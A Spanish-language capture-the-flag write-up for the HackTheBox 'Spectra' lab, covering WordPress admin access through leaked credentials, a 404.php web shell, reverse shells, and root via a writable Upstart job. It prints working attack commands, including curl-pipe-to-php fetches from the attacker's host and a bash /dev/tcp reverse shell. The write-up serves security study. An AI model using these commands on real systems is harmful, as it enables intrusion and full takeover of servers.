---
layout      : post
title       : "HackTheBox - Spectra"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317banner.png
category    : [ htb ]
tags        : [ wordpress, SUID, sudo, initctl ]
---
Máquina Linux (**Chromium OS**) nivel fácil. Nos veremos las caras con **WordPress** y su mala configuración por parte del administrador del sitio. Modificaremos **themones** para ejecutar comandos en el sistema. Encontraremos credenciales y jugaremos con archivos para configurar tareas, se volverán peligrosas porque podemos ejecutarlas como el usuario **root**, asignaremos el permiso **SUID** a la bash para obtener una Shell como administradores de la máquina.

![317spectraHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317spectraHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [egre55](https://www.hackthebox.eu/profile/1190).

Opa opa, como es!

Bueno, inicialmente nos enfrentaremos al gestor de contenido **WordPress**, enumerando encontraremos un "backup" del archivo de configuración de la base de datos, usaremos las credenciales para ingresar a la parte administrativa de **WordPress**. Estando acá modificaremos la plantilla `404.php` del **theme** `twentyseventeen` para agregar nuestro código y asi conseguir ejecucion remota de comandos y obtener una Reverse Shell como el usuario **nginx**.

Enumerando encontraremos una contraseña que esta siendo ejecutada/llamada por un archivo, si validamos contra los usuarios mediante `SSH` lograremos obtener una sesión como el usuario **katie**.

Veremos que **katie** esta asignada al grupo `developers`, un grupo que tiene varios archivos de **configuración de tareas** interesantes... Además si validamos que puede ejecutar **katie** con permisos de administrador en el sistema (`sudo -l`), encontraremos que tiene ejecución sobre el binario `/sbin/initctl` el cual principalmente se encarga de gestionar archivos de configuración de tareas. 

Relacionando los archivos que encontramos y el binario, lograremos ejecutar comandos en el sistema como el usuario administrador. Asignaremos el permiso **SUID** al binario `/bin/bash` para obtener una sesión como `root` en la máquina. 

A darleeeeeeee...

...

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Algo de cositas manuales, pero le cuesta mucho ser real.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

1. [Enumeración](#enumeracion).
2. [Explotación](#explotacion).
3. [Movimiento Lateral](#movimiento-lateral).
4. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

Realizaremos un escaneo de puertos para saber que servicios están activos:

```bash
❭ nmap -p- --open -v 10.10.10.229 -oG initScan
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los 65535.                                                                                  |
| --open     | Solo los puertos que están abiertos.                                                                      |
| -v         | Permite ver en consola lo que va encontrando.                                                             |
| -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/Writeups/master/HTB/Magic/images/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard. |

```bash
❭ cat initScan
# Nmap 7.80 scan initiated Mon Mar  8 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.229
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.229 ()   Status: Up
Host: 10.10.10.229 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 3306/open/tcp//mysql///, 8081/open/tcp//blackice-icecap///
# Nmap done at Mon Mar  8 25:25:25 2021 -- 1 IP address (1 host up) scanned in 75.89 seconds
```

Muy bien, tenemos:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)**: Acceso a un servidor remoto por medio de un canal seguro. |
| 80     | **[HTTP](https://es.wikipedia.org/wiki/Protocolo_de_transferencia_de_hipertexto)**: Servidor web.                |
| 3306   | **[MYSQL](https://es.wikipedia.org/wiki/MySQL)**: Sistema para gestionar bases de datos.                         |
| 8081   | **[blackice-icecap](https://apple.stackexchange.com/questions/393589/what-is-blackice-icecap-user-console-on-port-8081-on-my-macbook-air#answer-393612)**: Probablemente un software para la administración de un firewall. |

Ahora hagamos un escaneo de scripts y versiones con base en cada servicio (puerto):

```bash
❭ nmap -p 22,80,3306,8081 -sC -sV 10.10.10.229 -oN portScan
```

| Parámetro | Descripción |
| ----------|:----------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
❭ cat portScan
Nmap 7.80 scan initiated Mon Mar  8 25:25:25 2021 as: nmap -p 22,80,3306,8081 -sC -sV -oN portScan 10.10.10.229
Nmap scan report for 10.10.10.229
Host is up (0.12s latency).
                       
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey:
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http             nginx 1.17.4 
|_http-server-header: nginx/1.17.4          
|_http-title: Site doesn't have a title (text/html). 
3306/tcp open  mysql            MySQL (unauthorized) 
8081/tcp open  blackice-icecap?  
| fingerprint-strings:          
|   FourOhFourRequest, GetRequest:
|     HTTP/1.1 200 OK
|     Content-Type: text/plain   
|     Date: Mon, 08 Mar 2021 21:49:30 GMT
|     Connection: close  
|     Hello World  
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Mon, 08 Mar 2021 21:49:36 GMT
|     Connection: close
|_    Hello World
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8081-TCP:V=7.80%I=7%D=3/8%Time=60469B2E%P=x86_64-pc-linux-gnu%r(...);

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar  8 25:25:25 2021 -- 1 IP address (1 host up) scanned in 27.75 seconds
```

Obtenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :-------|
| 22     | SSH      | OpenSSH 8.1 (protocol 2.0)     |
| 80     | HTTP     | nginx 1.17.4                   |
| 3306   | MYSQL    | MySQL (unauthorized) <- (raro) |
| 8081   | HTTP     | Ni idea :P                     |

Empezamos a enumerar cada servicio a ver por donde podemos entrar...

...

### Puerto 80 [⌖](#puerto-80) {#puerto-80}

![317page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80.png)

Bien, nos indica que están esperando a que **IT** les configure el "seguimiento de incidentes" y hay dos links:

Si ingresamos a cualquiera de los dos, obtenemos un error:

![317page80_without_etcHosts](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_without_etcHosts.png)

* Software Issue Tracker: `http://spectra.htb/main/index.php`.
* Test: `http://spectra.htb/testing/index.php`.

Vemos un dominio: `spectra.htb`, asi que agreguémoslo a nuestro archivo `/etc/hosts` para que cuando ingresemos a la dirección IP nos redireccione/resuelva al dominio (o simplemente colocando el dominio).

* [The **/etc/hosts** file](https://tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap9sec95.html).

```bash
❭ cat /etc/hosts
...
10.10.10.229  spectra.htb
...
```

Y ahora validemos los links:

**main**:

![317page80_with_etc_main](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_with_etc_main.png)

**testing**:

![317page80_with_etc_testing](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_with_etc_testing.png)

Interesante...

...

**main**:

Enumerando sabemos que estamos sobre un [WordPress](https://es.wikipedia.org/wiki/WordPress) (gestor de contenido para crear cualquier tipo de página web). Viendo el código fuente nos encontramos con varias rutas, en la que podemos intentar enumerar e incluso validar si alguna es vulnerable a alguna inyección, pero no, no obtenemos ninguna respuesta de que por ahí sean los tiros...

Como es habitual, tenemos el archivo `/wp-login.php`:

![317page80_wp_loginPHP](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_wp_loginPHP.png)

Intentando algunos usuarios potenciales, vemos que la web válida si un usuario es válido asi la contraseña sea inválida:

![317page80_wp_loginPHP_admin_err](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_wp_loginPHP_admin_err.png)

Sabemos que el usuario `administrator` existe... Podríamos pensar en brute-force, pero pues aún podemos enumerar el sitio `/testing`.

**testing**:

Acá podemos ver varios archivos si le quitamos el `index.php` de la ruta `http://spectre.htb/testing/index.php`:

![317page80_testing_files](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_testing_files.png)

En esta parte sobre pensé muuuuuuuuucho las cosas y me puse a buscar y buscar cosas, cuando realmente lo necesario estuvo siempre al inicio, si nos fijamos hay un archivo llamado `wp-config.php.save` que podemos intuir que es un backup del archivo `wp-config.php`. Si ingresamos al archivo no nos lo va a descargar (por esto quizás también lo ignore al inicio) porque la extensión no lo permite (a diferencia de si fuera un `.bak` que si se nos hubiera descargado al ingresar a él). Pero podemos descargarlo desde la consola con `wget`:

```bash
❭ wget http://spectra.htb/testing/wp-config.php.save
❭ file wp-config.php.save 
wp-config.php.save: PHP script, ASCII text, with CRLF line terminators
```

Viendo su contenido:

![317bash_wp_configPHPsave_cat_file](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317bash_wp_configPHPsave_cat_file.png)

Efectivamente es una copia o al menos tiene el formato del archivo de configuración y como vemos nos brinda unas credenciales de un usuario de la base de datos...

Probemos esas credenciales hacia el login que teníamos antes a ver si logramos acceder. 

Con el usuario `devtest` nos muestra:

> Unknown username. Check again or try your email address.

Si validamos con el usuario `administrator` tenemos:

![317page80_wp_loginADMINdone](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_wp_loginADMINdone.png)

Listos, la contraseña es válida con él, tamos dentro :P

Despues de husmear por ahí, recordé que una vez [s4vitar](https://s4vitar.github.io/) dijo que si conseguimos entrar como administradores al sitio `WordPress`, sencillamente podríamos modificar la plantilla `404.php` para inyectar nuestro código `PHP` y direccionarnos hacia la URL para comprobar que nuestro código se esté ejecutando. Vamos a hacerlo.

...

## Explotación [#](#explotacion) {#explotacion}

Estando dentro tenemos el apartado > `Appereance` > `Theme Editor`, entramos ahí y tenemos:

![317page80_wp_admin_themeEditor](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_wp_admin_themeEditor.png)

* Tengamos en cuenta el select del tema a editar.
* Si nos fijamos, tenemos la plantilla del `404.php` en el theme `twentytwenty`, veámoslo.

![317page80_wp_admin_themeE_404php](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_wp_admin_themeE_404php.png)

Validemos la ruta en la web:

![317page80_theme_twentytwenty_404php](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_theme_twentytwenty_404php.png)

Jmm pues concuerda con que en la línea 10 del código esta esa función, intentemos modificar el archivo para ver si logramos inyectar código:

```php
...
echo "hola";
...
```

![317page80_wp_admin_tE_twenty_404php_editHola](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_wp_admin_tE_twenty_404php_editHola.png)

Y damos clic en el botón `Update File`:

> Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP.

Obtenemos ese error...

Vi validamos el select (al que hice mención antes) tiene 3 themes, `twentynineteen`, `twentyseventeen` y `twentytwenty`. Si cambiamos el theme al `twentyseventeen`, vamos al código del `404.php` e intentamos hacer el mismo procedimiento de antes, tenemos:

```php
<?php
...
 */
echo "hola";
get_header(); ?>
...
```

> File edited successfully.

Validamos ahora en la web:

![317page80_theme_seven_404php_editHola](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_theme_seven_404php_editHola.png)

Perfecto, podemos ver el contenido modificado. Ahora con esto podemos ejecutar comandos en el sistema, validémoslo:

```php
...
$coma=shell_exec($_GET['xmd']); echo $coma;
...
```

Le indicamos que nos guarde en la variable `xmd` todo lo que se envíe por medio de una petición `GET` (por medio de la URL) y que ese valor lo ejecute en el sistema (`shell_exec`) y su resultado nos lo guarde en la variable `coma`, despues simplemente mostramos ese valor. Veámoslo en ejecución:

Le decimos que nos muestre quien somos y en que hostname estamos:

```html
http://10.10.10.229/main/wp-content/themes/twentyseventeen/404.php?xmd=whoami;hostname
```

![317page80_theme_seven_404php_RCE](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_theme_seven_404php_RCE.png)

Opa, somos `nginx` y estamos en el host principal. Entablémonos una Reverse Shell:

Bueno, despues de varios intentos nos damos cuenta de que `nc` no esta instalado o no lo toma, también vemos que hay problemas con `bash`, ya que si intentamos establecer la RevSH creándonos un archivo que cuando se ejecute nos lancé la petición para la Shell no hace nada:

Creamos el archivo:

```bash
❭ cat rerere.sh
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.194/4433 0>&1
```

Creamos servidor web con `Python`:

```bash
❭ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Nos ponemos en escucha:

```bash
❭ nc -lvp 4433
listening on [any] 4433 ...
```

Y ahora en la web (podemos pasar los comandos a `URL Encode` para evitar errores de concatenación y sintaxis) le indicamos que nos descargue ese archivo y a la vez nos lo ejecute con `bash`:

```html
<!-- Sin URL encode -->
xmd=curl http://10.10.14.194:8000/rerere.sh | bash

<!-- URL Encode -->
xmd=curl%20http%3A%2F%2F10.10.14.194%3A8000%2Frerere.sh%20%7C%20bash
```

Pero al ejecutar no pasa nada, probé cambiando el path de `bash`, jugando con `sh` (pueden validar que shells hay activas en la máquina visitando el archivo `/etc/shells`), moviendo el archivo a `/tmp` y despues ejecutándolo, pero nada...

* [Moving files with **cURL**](https://stackoverflow.com/questions/16362402/save-file-to-specific-folder-with-curl-command).

Asi que recordé que `pentest monkey` tiene una Reverse Shell con `PHP`, probando con ella logramos obtener la Shell (:

* [pentestmonkey / php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

Descargamos el archivo y modificamos dentro de él los campos `ip` y `port` por los nuestros:

```php
...
$ip = '10.10.14.194';  // CHANGE THIS
$port = 4433;       // CHANGE THIS
...
```

Ahora simplemente le indicamos que nos haga una petición a ese archivo, pero como plus le indicamos que su contenido lo interprete con `PHP`:

```html
<!-- Sin URL encode -->
xmd=curl http://10.10.14.194:8000/phpr.php | php

<!-- URL encode -->
xmd=curl%20http%3A%2F%2F10.10.14.194%3A8000%2Fphpr.php%20%7C%20php
```

Y en nuestro `nc` tenemos:

![317bash_revSH_nginx](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317bash_revSH_nginx.png)

Perfecto, ahora si tenemos una Shell (: Pueeeees, a enumerar...

* [Realizando **tratamiento de la TTY** con ayuda de **S4vitar**](https://www.youtube.com/watch?v=GVjNI-cPG6M&t=1689).

...

(Validando el porqué no pudimos obtener RCE mediante `bash` ni `nc`)

```bash
bash-4.3$ which nc
which: no nc in ((null))
bash-4.3$ locate nc
locate: can not stat () `/usr/local/db/mlocate/mlocate.db': Permission denied
bash-4.3$ nc
bash: nc: command not found
bash-4.3$ bash -i >& /dev/tcp/10.10.14.194/4434 0>&1
bash: /dev/tcp/10.10.14.194/4434: No such file or directory
```

En todos obtuvimos errores, por eso no había ninguna ejecución :(

La flag del user esta en el usuario `katie`:

...

## Movimiento lateral [#](#movimiento-lateral) {#movimiento-lateral}

Enumerando nos encontramos con un archivo raro en la ruta `/opt/autologin.conf.orig`:

```bash
nginx@spectra:/opt$ cat autologin.conf.orig 
# Copyright 2016 The Chromium OS Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.
description   "Automatic login at boot"
author        "chromium-os-dev@chromium.org"
# After boot-complete starts, the login prompt is visible and is accepting
# input.
start on started boot-complete
script
  passwd=
  # Read password from file. The file may optionally end with a newline.
  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
    if [ -e "${dir}/passwd" ]; then
      passwd="$(cat "${dir}/passwd")"
      break
    fi
  done
  if [ -z "${passwd}" ]; then
    exit 0
  fi
  # Inject keys into the login prompt.
  #
  # For this to work, you must have already created an account on the device.
  # Otherwise, no login prompt appears at boot and the injected keys do the
  # wrong thing.
  /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter
end script
```

Inspeccionando nos indica que esta tomando una password de un archivo llamado `passwd` de las rutas `/mnt/stateful_partition/etc/autologin` y `/etc/autologin`, si comprobamos esas rutas buscando el dichoso archivo, lo encontramos en `/etc/autologin`:

```bash
nginx@spectra:/opt$ ls -la /etc/autologin
total 12
drwxr-xr-x  2 root root 4096 Feb  3 16:43 .
drwxr-xr-x 63 root root 4096 Feb 11 10:24 ..
-rw-r--r--  1 root root   19 Feb  3 16:43 passwd
nginx@spectra:/opt$ cat /etc/autologin/passwd 
SummerHereWeCome!!
```

Jmmm, pues tenemos una "contraseña", si probamos `su katie` nos da un error:

```bash
nginx@spectra:/opt$ su katie
su: error while loading shared libraries: libpam.so.2: cannot open shared object file: No such file or directory
```

Pero si recordamos, tenemos el puerto `22` abierto:

![317bash_katieSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317bash_katieSH.png)

LOL, pues somos **katie**, super raro el encontrar la pw así...

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Estamos en un grupo llamado `developers`, tenemos archivos relacionados con `root` y `katie`:

```bash
katie@spectra ~ $ id
uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
katie@spectra ~ $ find / -group developers -ls 2>/dev/null
    32121      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test6.conf
    32123      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test7.conf
    32109      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test3.conf
    32112      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test4.conf
    32103      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test.conf
    32126      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test8.conf
    32128      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test9.conf
    32106      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test10.conf
    32108      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test2.conf
    32120      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test5.conf
    32105      4 -rw-rw----   1 root     developers      478 Jun 29  2020 /etc/init/test1.conf
    23762      4 drwxr-xr-x   2 root     developers     4096 Jun 29  2020 /srv
    23763      4 -rwxrwxr-x   1 root     developers      251 Jun 29  2020 /srv/nodetest.js
```

También nos damos cuenta enumerando los permisos de **katie** como administrador del sistema (`sudo -l`) que puede ejecutar un binario:

```bash
katie@spectra ~ $ sudo -l
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
katie@spectra ~ $
```

> **initctl** allows a system administrator to communicate and interact with the `Upstart` init daemon.
>> [manpages.ubuntu - initctl](http://manpages.ubuntu.com/manpages/xenial/man8/initctl.8.html).

> Upstart es un reemplazo basado en eventos para el daemon init, el método utilizado por varios sistemas operativos Unix-like para realizar tareas durante el arranque del sistema.
>> [Wikipedia - Upstart](https://es.wikipedia.org/wiki/Upstart).

* [Más info de **Upstart** y su gestión de tareas en el arranque](https://ikasten.io/2011/10/12/upstart-una-introduccion-para-los-viejos-rockeros-de-init/).
* [Un post que me encanto por como se estructuró el uso de los archivos **.conf**](https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it).

Vale, si vemos algunos de los archivos `.conf` ([archivos de configuración de tareas](https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it)) y los comparamos entre sí, vemos que todos tienen el mismo contenido, asi que elijamos por ejemplo el archivo `/etc/init/test9.conf` para trabajar:

```bash
katie@spectra /etc/init $ cat test9.conf 
description "Test node.js server"
author      "katie"

start on filesystem or runlevel [2345]
stop on shutdown

script

    export HOME="/srv"
    echo $$ > /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script

pre-start script
    echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
end script

pre-stop script
    rm /var/run/nodetest.pid
    echo "[`date`] Node Test Stopping" >> /var/log/nodetest.log
end script
```

Entonces tenemos:

* Simplemente cada vez que se inicia la tarea, esta ejecuta el script `/srv/nodetest.js` mediante el binario `node`.
* Y guarda un log una vez es iniciado (con su hora y fecha) y una vez es finalizado (también con hora y fecha).

Si miramos el script (`/srv/nodetest.js`) que ejecuta entendemos que significa el puerto `8081` que vimos en nuestro escaneo inicial:

```js
var http = require("http");

http.createServer(function (request, response) {
   response.writeHead(200, {'Content-Type': 'text/plain'});
   
   response.end('Hello World\n');
}).listen(8081);

console.log('Server running at http://127.0.0.1:8081/');
```

Ya que esta levantando un servidor web en ese puerto... Lo que quiere decir que cada vez que algún `testX.conf` esta activo, tendríamos el puerto `8081` abierto.

Para ver que **jobs** están activos de los que nos interesan (`testX.conf`) podemos ejecutar:

```bash
katie@spectra /etc/init $ sudo /sbin/initctl list | grep test
test stop/waiting
test1 stop/waiting
test7 stop/waiting
test6 stop/waiting
test5 stop/waiting
test4 stop/waiting
test10 stop/waiting
test9 stop/waiting
test8 stop/waiting
test3 stop/waiting
test2 stop/waiting
```

Para iniciar o detener simplemente indicamos `start` o `stop` respectivamente y el nombre del job. 

Entonces sabemos que podemos ejecutar este comando como usuario administrador del sistema, además sabemos que podemos modificar los archivos, ya que su grupo es el grupo `developers`, en el cual estamos nosotros. Asi que podemos probar a guardar el input del `id` en el mismo archivo `.log` y asi corroborar que somos root y que tenemos ejecucion de comandos, démosle a ver:

```bash
katie@spectra /etc/init $ cat test9.conf 
...
pre-start script
    echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
    id >> /var/log/nodetest.log
end script
...
```

Entonces, cuando hagamos `start` guardara la cadena de texto, pero además (si todo va bien) guardara el id del usuario que ejecuta la tarea (en este caso `root` al hacer uso de `sudo`):

```bash
katie@spectra /etc/init $ sudo /sbin/initctl start test9
test9 start/running, process 4684
```

Yyyyy:

```bash
katie@spectra /etc/init $ cat /var/log/nodetest.log
[Tue Mar  9 16:41:30 PST 2021] Node Test Starting
uid=0(root) gid=0(root) groups=0(root)
```

Perfecto, peeeeeeeeeeeeeerfecto, con esto ya podríamos directamente ver la flag, pero intentemos obtener una Shell (aun teniendo en cuenta los problemitas que puso `bash` al inicio).

Para esto podemos otorgarle el permiso `SUID` a la bash que tenemos, asi despues simplemente indicaríamos `bash -p` (para que atienda al privilegio del `SUID`) y cambiaríamos la Shell inicial (`katie`) a la que esta ejecutando `root`:

* [Asignando **SUID** a la bash para convertirnos en **root** - S4vitar lo explica también :P](https://www.youtube.com/watch?v=KH9EGcDMMRI&t=1527s).

> Los binarios **SUID** permiten a los usuarios ejecutar un archivo ejecutable con los permisos del archivo ejecutable o el propietario del grupo.
>> [Permiso **s** en un objeto linux](https://www.enmimaquinafunciona.com/pregunta/11304/como-puedo-borrar-el-permiso-de-s-en-un-directorio-en-linux).

Entonces, primero validemos como esta el binario `/bin/bash` antes de asignarle el permiso `SUID`:

```bash
katie@spectra /etc/init $ ls -la /bin/bash
-rwxr-xr-x 1 root root 551984 Dec 22 05:46 /bin/bash
# Tiene el permiso 755, pero faltaria el 4 (que es el SUID)
```

En estos momentos no podemos hacer nada con esa bash, ya que se ejecutaría una sesión dependiendo el usuario que lo ejecute, no el propietario...

Vamos al archivo job y agregamos:

```bash
...
pre-start script
    echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
    chmod 4755 /bin/bash
end script
...
```

Y ejecutamos:

```bash
katie@spectra /etc/init $ sudo /sbin/initctl start test9
```

Y si validamos ahora el binario `/bin/bash`:

![317bash_change_binBASH_SUID](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317bash_change_binBASH_SUID.png)

Perfecto, para validar lo que hicimos simplemente ejecutaríamos el binario, pero con el parámetro `-p` para que tome el SUID:

```bash
katie@spectra /etc/init $ /bin/bash
bash-4.3$ whoami
katie
bash-4.3$ exit
katie@spectra /etc/init $ /bin/bash -p
bash-4.3# whoami
root
```

Listones, solo nos quedaría ver las flags :P

![317flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317flags.png)

...

Wenoo, la parte de la contraseña de `katie` me pareció realmente rara y medio fea (aunque parece algo "real" del entorno `chronium-os`), pero por lo demás me gusto, fue la primera vez que jugué con la asignación del permiso `SUID` al binario `/bin/bash` y que lo documento, asi que una nueva cosita que queda plasmada (:

Muchas gracias por leer y como siempre, a romper todo, bless y feliz vida.